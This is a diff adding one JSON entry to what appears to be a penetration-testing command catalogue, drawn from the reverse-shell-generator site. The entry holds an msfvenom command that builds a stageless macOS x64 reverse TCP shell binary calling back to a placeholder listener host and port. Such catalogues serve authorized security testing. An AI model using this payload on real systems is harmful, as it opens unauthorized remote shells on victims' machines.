@@ -1,0 +1,31 @@
+{
+  "id": "rsg-msfvenom-macos-stageless-reverse-tcp-x64",
+  "name": "RSG · MSFVenom · macOS Stageless Reverse TCP (x64)",
+  "command": "msfvenom -p osx/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f macho -o shell.macho",
+  "description": "M S F Venom payload — macOS Stageless Reverse TCP (x64) (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "mac",
+    "stageless",
+    "reverse"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/macOS Stageless Reverse TCP (x64)/95",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
